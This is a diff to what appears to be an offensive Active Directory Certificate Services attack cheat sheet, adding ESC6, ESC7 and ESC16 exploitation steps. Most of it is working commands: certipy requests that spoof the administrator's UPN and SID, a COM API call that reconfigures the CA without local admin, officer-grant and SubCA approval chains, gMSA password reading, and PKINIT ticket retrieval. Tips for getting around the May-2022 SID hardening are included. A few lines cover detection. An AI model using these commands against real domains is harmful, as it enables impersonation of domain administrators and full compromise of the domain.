@@ -103,26 +103,65 @@ CA has this flag set → ANY template with client auth EKU allows enrollee-suppl
 # Check flag
 certipy find ... | grep -i "EDITF_ATTRIBUTESUBJECTALTNAME2"
 
-# Exploit: same as ESC1 — use any client auth template
+# Exploit: same as ESC1 — use any client auth template you can enroll in (User/Machine)
 certipy req -u user@domain.local -p pass -ca '<CA>' -template 'User' \
   -upn administrator@domain.local
 certipy auth -pfx administrator.pfx -domain domain.local -username administrator
+```
+
+**Post-May-2022 SID extension (the ESC6-alone trap).** Patched CAs embed the *requester's* SID in
+`szOID_NTDS_CA_SECURITY_EXT`, and a Full-Enforcement KDC binds on it — so a SAN-spoofed cert still
+authenticates as *you*, and `certipy auth` aborts with `Object SID mismatch between certificate and
+user`. Two fixes:
+
+- **Embed the victim SID** (ESC6 lets you supply arbitrary SAN incl. the SID URL):
+  ```bash
+  certipy req ... -upn administrator@domain.local -sid S-1-5-21-<dom>-500
+  ```
+  Cert now carries UPN + Administrator's SID → passes both certipy's check and the KDC.
+- **Chain with ESC16** (below) to disable the SID extension globally, then no `-sid` needed.
+
+If `certipy auth` still refuses on SID, PKINIT directly with PKINITtools (no SID check):
+```bash
+certipy cert -pfx administrator.pfx -nokey -out adm.crt; certipy cert -pfx administrator.pfx -nocert -out adm.key
+python3 PKINITtools/gettgtpkinit.py -cert-pem adm.crt -key-pem adm.key domain.local/administrator adm.ccache -dc-ip <dc>
 ```
 
 ---
 
 ## ESC7 — CA Manager / Officer Rights
 
-User has `ManageCA` or `ManageCertificates` right → enable EDITF_ATTRIBUTESUBJECTALTNAME2 on CA (→ ESC6 chain).
+`ManageCA` (CA Administrator) or `ManageCertificates` (Officer) on the CA. Two exploitation routes;
+pick by which right you hold. A gMSA/service account is a common holder — read its password first
+(`nxc ldap --gmsa`, needs the `PrincipalsAllowedToReadPassword` principal), then PtH.
 
-```bash
-# Enable flag
-certipy ca -u user@domain.local -p pass -ca '<CA>' -enable-attribute-subjectaltname2 -target <dc_ip>
-
-# Then exploit as ESC6
-certipy req -u user@domain.local -p pass -ca '<CA>' -template 'SubCA' \
-  -upn administrator@domain.local
+**Route A — ManageCA → reconfigure CA to ESC6 (cleanest, no officer/approval).**
+Enabling EDITF needs writing the policy-module registry. `certutil -setreg` **requires local admin**
+(fails `requires elevation`) even for a CA admin — so use the **COM API `ICertAdmin2::SetConfigEntry`**,
+which only checks ManageCA. ManageCA can also stop/start CertSvc (`sc.exe`), which `Restart-Service`
+may not. Run from any shell as the ManageCA principal (e.g. WinRM as the gMSA):
+```powershell
+$CA=New-Object -ComObject CertificateAuthority.Admin; $C="DC01.domain.local\<CA>"
+$CA.SetConfigEntry($C,"PolicyModules\CertificateAuthority_MicrosoftDefault.Policy","EditFlags",(<cur> -bor 0x40000)) # ESC6
+sc.exe stop certsvc; sc.exe start certsvc
 ```
+Then enroll as a *Domain User* account (the gMSA is usually in Domain Computers, not Users → can't
+enroll `User`) with `-upn administrator -sid <admin-sid>` (see ESC6).
+
+**Route B — ManageCA → add Officer → approve SubCA request.**
+```bash
+certipy ca -ca '<CA>' -u mgr@dom -hashes :<h> -add-officer <you>        # grant ManageCertificates
+certipy ca -ca '<CA>' -u mgr@dom -hashes :<h> -enable-template SubCA
+echo y | certipy req -u <you>@dom -p pass -ca '<CA>' -template SubCA -upn administrator@dom -sid <admin-sid>  # denied, saves <id>.key
+certipy ca -ca '<CA>' -u <officer>@dom -p pass -issue-request <id>       # approve as officer
+echo y | certipy req -u <you>@dom -p pass -ca '<CA>' -retrieve <id>
+```
+Gotchas that cause `Insufficient permissions to issue certificate`:
+- **Officer rights need a CertSvc restart** to load — after `-add-officer`, restart the CA.
+- The issuing principal needs **both** ManageCertificates (officer) **and** `Certificate Service DCOM
+  Access` (contains Authenticated Users by default). An explicit `Deny Certificate Manager` ACE on the
+  gMSA overrides its Allow — approve as the *added officer*, not the gMSA.
+- Verify state on the CA: `certutil -getreg CA\Security` (officer ACEs), `certutil -getreg CA\OfficerRights`.
 
 ---
 
@@ -309,6 +348,27 @@ certipy auth -pfx attacker.pfx -domain domain.local -username <target> -dc-ip <d
 ```
 
 ---
+
+## ESC16 — SID Security Extension Globally Disabled
+
+The CA has `szOID_NTDS_CA_SECURITY_EXT` (`1.3.6.1.4.1.311.25.2`) in its policy `DisableExtensionList`
+→ **no** cert it issues carries the requester SID. Every issued cert then authenticates purely by
+UPN/SAN, defeating the May-2022 hardening for the whole CA. Pairs with ESC6 (or any SAN control) to
+impersonate anyone without needing `-sid`.
+
+```powershell
+# Set (needs ManageCA; COM API, no local admin) then restart CertSvc
+$CA=New-Object -ComObject CertificateAuthority.Admin
+$CA.SetConfigEntry("DC01.domain.local\<CA>","PolicyModules\CertificateAuthority_MicrosoftDefault.Policy","DisableExtensionList","1.3.6.1.4.1.311.25.2")
+sc.exe stop certsvc; sc.exe start certsvc
+```
+```bash
+# Detect: certipy flags ESC16, or read the reg value
+certutil -config "DC01\<CA>" -getreg policy\DisableExtensionList
+# Exploit (ESC6+ESC16): request as any enrollable user with victim UPN, no SID needed
+echo y | certipy req -u svc@dom -p pass -ca '<CA>' -template User -upn administrator@dom -dc-ip <dc>
+certipy auth -pfx administrator.pfx -dc-ip <dc>   # cert has no SID → KDC maps by UPN → Administrator
+```
 
 ## Golden Certificate (ESC5 — CA Key Compromise)
 
